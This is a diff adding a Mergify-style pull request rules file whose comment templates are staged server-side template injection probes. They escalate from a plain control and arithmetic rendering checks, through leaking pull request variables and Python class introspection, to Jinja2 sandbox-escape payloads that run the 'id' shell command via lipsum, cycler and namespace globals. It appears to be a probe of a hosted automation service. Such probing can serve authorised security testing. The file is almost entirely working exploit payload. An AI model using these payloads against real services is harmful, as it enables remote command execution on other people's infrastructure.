@@ -1,0 +1,31 @@
+pull_request_rules:
+  - name: ssti-r0-control
+    conditions:
+      - base=master
+    actions:
+      comment:
+        message: "MGFYTEST r0 control: plain text, no template syntax"
+  - name: ssti-r1-render
+    conditions:
+      - base=master
+    actions:
+      comment:
+        message: "MGFYTEST r1: T1={{ 7*7 }} T2={{ 'ab'*3 }} T3={{ [1,2,3]|length }}"
+  - name: ssti-r2-vars
+    conditions:
+      - base=master
+    actions:
+      comment:
+        message: "MGFYTEST r2: author={{ author }} title={{ title }} base={{ base.ref }} head={{ head.ref }} number={{ number }}"
+  - name: ssti-r3-sandbox
+    conditions:
+      - base=master
+    actions:
+      comment:
+        message: "MGFYTEST r3: A={{ ''.__class__ }} B={{ ''.__class__.__mro__ }} C={{ ''.__class__.__mro__[1].__subclasses__() | length }} D={{ ''|attr('__class__') }}"
+  - name: ssti-r4-escape
+    conditions:
+      - base=master
+    actions:
+      comment:
+        message: "MGFYTEST r4: L={{ lipsum.__globals__['os'].popen('id').read() }} C={{ cycler.__init__.__globals__.os.popen('id').read() }} N={{ namespace.__init__.__globals__['os'].popen('id').read() }}"
